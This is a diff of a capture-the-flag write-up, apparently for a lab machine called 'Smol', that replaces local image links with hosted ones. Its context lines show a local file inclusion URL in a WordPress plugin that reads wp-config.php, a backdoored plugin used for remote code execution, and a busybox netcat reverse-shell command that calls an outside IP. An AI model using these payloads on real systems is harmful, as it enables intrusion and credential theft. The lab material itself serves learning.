@@ -43,7 +43,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Port 80:
 
-![img.png](img.png)
+![image](https://github.com/user-attachments/assets/9208581f-e4d4-4a31-b7fa-ef39f8b53f81)
+
 
 It was just like a ctf information type page hosted. Things to note from here:
 
@@ -100,7 +101,8 @@ WordPress JSmol2WP plugin 1.07 is susceptible to local file inclusion via ../ di
 [http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php](http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php)
 ```
 
-![img_1.png](img_1.png)
+![image 1](https://github.com/user-attachments/assets/4fea4328-61e2-4e61-a00a-cd0c929e71de)
+
 
 Username found: wpuser
 
@@ -112,9 +114,10 @@ Now, we can log in to /wp-login.php and enumerate it further for initial access.
 
 After logging in to wordpress, we can see in pages page, there was a private page named “Webmaster tasks!!” which was looks like some assingned to someone, but here we got something for us.
 
-![img_2.png](img_2.png)
+![image 2](https://github.com/user-attachments/assets/f4b71c69-0f46-4f38-b6df-dc4025644813)
 
-![img_3.png](img_3.png)
+![image 3](https://github.com/user-attachments/assets/826704dc-d0d7-424f-bc6b-9794981ea692)
+
 
 Look at task 1: [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
 
@@ -168,7 +171,8 @@ I didn’t understand what this line of code does, so used chatgpt to decode tha
 
 Let’s check that in [http://www.smol.thm/wp-admin/index.php](http://www.smol.thm/wp-admin/index.php) page, if it works:
 
-![img_4.png](img_4.png)
+![image 4](https://github.com/user-attachments/assets/dd1ca23b-ebeb-4b6b-8e7d-c65a8f3070fc)
+
 
 We got remote code execution!
 
@@ -181,7 +185,8 @@ busybox nc 10.17.87.131 4445 -e /bin/sh
 Url = http://www.smol.thm/wp-admin/index.php?cmd=busybox%20nc%2010.17.87.131%204445%20-e%20%2Fbin%2Fsh
 ```
 
-![img_5.png](img_5.png)
+![image 5](https://github.com/user-attachments/assets/9cc14d51-1acf-4b9a-a42a-72adfdb926a2)
+
 
 let’s upgrade our shell via python tty:
 
